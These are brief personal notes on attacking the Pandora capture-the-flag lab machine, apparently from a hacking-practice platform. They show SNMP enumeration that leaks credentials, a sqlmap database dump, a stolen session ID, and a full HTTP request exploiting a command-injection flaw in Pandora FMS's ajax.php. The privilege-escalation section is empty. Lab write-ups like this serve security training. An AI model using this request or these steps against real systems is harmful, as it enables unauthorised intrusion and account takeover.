# Pandora

---

## Enumeration

- nmap shows port 161 UDP open for snmp
- 

---

## Foothold

### SNMP

- `snmpwalk -v 1 -c public $IP`
- Got creds: `Daniel:HotelBabylon23`
- User flag is under user Matt
- Forwarded port 80 through SSH
- Pandora FMS Login form? sqli?
- Found metasploit module RCE
- used sqlmap to dump database

```
tpassword_history
tsessions_php
```

- Passwords in `tpassword_history` cannot be cracked.
- Stole valid session ID as Matt: `g4e01qdgk36mfdh90hvcc54umq`
- RCE vuln in POST Req to `/ajax.php`
- Got revshell as matt

```
POST /pandora_console/ajax.php HTTP/1.1
Host: localhost
Content-Length: 88
sec-ch-ua: "Chromium";v="105", "Not)A;Brand";v="8"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pandora_console/index.php?sec=eventos&sec2=operation/events/events
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ddhf6p3piuq2dut7djt2vmedom
Connection: close

page=include%2Fajax%2Fevents&target=whoami&response_id=1&perform_event_response=10000000
```

- 

---

## PrivEsc

